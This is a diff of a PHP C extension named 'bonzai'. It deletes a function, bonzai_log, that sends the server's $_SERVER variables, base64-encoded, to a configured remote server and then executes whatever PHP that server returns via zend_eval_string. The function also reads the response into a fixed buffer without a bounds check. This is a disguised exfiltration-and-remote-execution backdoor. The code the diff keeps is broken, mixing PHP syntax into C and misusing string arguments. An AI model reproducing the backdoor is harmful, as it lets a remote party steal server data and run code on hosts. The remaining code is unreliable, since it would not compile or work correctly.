@@ -313,79 +313,34 @@ PHP_FUNCTION(bonzai_version)
 }
 // }}}
 
-// {{{ PHP_FUNCTION bonzai_log
-/**
- * Send an access to logging server
- */
-PHP_FUNCTION(bonzai_log)
-{
-    // LIKE serialize
-    zval **struc;
-    php_serialize_data_t var_hash;
-    smart_str buf = {0};
-
-    PHP_VAR_SERIALIZE_INIT(var_hash);
-    php_var_serialize(&buf, &PG(http_globals)[TRACK_VARS_SERVER], &var_hash TSRMLS_CC);
-    PHP_VAR_SERIALIZE_DESTROY(var_hash);
-
-    char *n_param = bonzai_base64_encode((char *)buf.c);
-    char *server = INI_STR("bonzai.log_server");
-    int len = 11 + strlen(server) + strlen(n_param);
-    char *file = emalloc(len);
-    sprintf(file, "%s?op=log&pc=%s", server, n_param);
-    file[len] = '\0';
-
-    int size = 0;
-    // LIKE readfile
-    php_stream_context *context = NULL;
-    php_stream *stream = php_stream_open_wrapper_ex(file, "rb", 0 | ENFORCE_SAFE_MODE | REPORT_ERRORS, NULL, context);
-    char content[BONZAI_MAX_LEN];
-    if (stream) {
-        size_t bcount = 0;
-        char buf[1];
-        int b;
-
-        while ((b = php_stream_read(stream, buf, sizeof(buf))) > 0) {
-            content[bcount] = buf[0];
-            bcount += b;
-        }
-        content[bcount] = '\0';
-        php_stream_close(stream);
-    }
-    efree(file);
-
-    char *message;
-    char *tmp = (char *)emalloc(22 * sizeof(char));
-    strncpy(tmp, content, 22);
-    tmp[22] = '\0';
-    if (strcmp(tmp, "<br />\n<b>Warning</b>:")) {
-        if (INI_STR("bonzai.not_reachable_die") == "true") die(INI_STR("bonzai.error_connection"));
-        else php_printf("%s", INI_STR("bonzai.error_connection"));
-    }
-    efree(tmp);
-
-    char *compiled_string_description = zend_make_compiled_string_description("Nothing to declare... for now ;)" TSRMLS_CC);
-    zend_eval_string(content, NULL, compiled_string_description TSRMLS_CC);
-    efree(compiled_string_description);
-}
-// }}}
-
 /**
  * @see php/ext/standard/file.c
  */
 char *bonzai_get_bytecode(char *filename) {
+    /* TODO: CONVERT FROM PHP TO C
+    if (empty(filename) || !file_exists(filename)) {
+        php_error_docref(NULL TSRMLS_CC, E_NOTICE, "The file `%s` is invalid.");
+    }
+
+    if (!is_readable(filename)) {
+        php_error_docref(NULL TSRMLS_CC, E_NOTICE, "The file `%s` is not readable.");
+    }
+
+    if (filesize(filename) == 0) {
+        php_error_docref(NULL TSRMLS_CC, E_NOTICE, "The file `%s` is empty.");
+    }
+    */
+
     char *tmpname = tempnam('.', "BNZTMP");
     FILE *fh = fopen(tmpname, 'w');
-    bcompiler_write_header(fh);
+
     bcompiler_write_file(fh, filename);
-    bcompiler_write_footer(fh);
     fclose(fh);
 
     char *content = file_get_contents(tmpname);
-
     unlink(tmpname);
 
-    //content = bonzai_convert_to_hex(bonzai_gzcompress($content, 9));
+    //content = bonzai_convert_to_hex(bonzai_gzcompress($content, 9)); // TODO: UNCOMMENT
     content = bonzai_base64_encode(bonzai_gzcompress($content, 9));
 
     return content;
